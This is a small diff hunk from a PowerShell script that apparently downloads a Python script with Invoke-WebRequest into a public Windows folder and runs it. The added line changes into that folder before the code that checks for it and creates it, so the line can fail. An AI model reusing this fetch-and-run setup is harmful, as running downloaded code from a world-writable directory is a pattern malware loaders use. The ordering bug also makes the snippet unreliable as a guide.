@@ -35,6 +35,7 @@ $pythonPath = "$pythonPath\python.exe"
 
 # Download the python script directly with invoke-webrequest
 $outDirectory = "C:\Users\Public\Other\Protection"  # Temp directory in Windows
+cd "$outDirectory"
 
 # Check if the directory exists, and create it if not
 if (-not (Test-Path -Path $outDirectory)) {
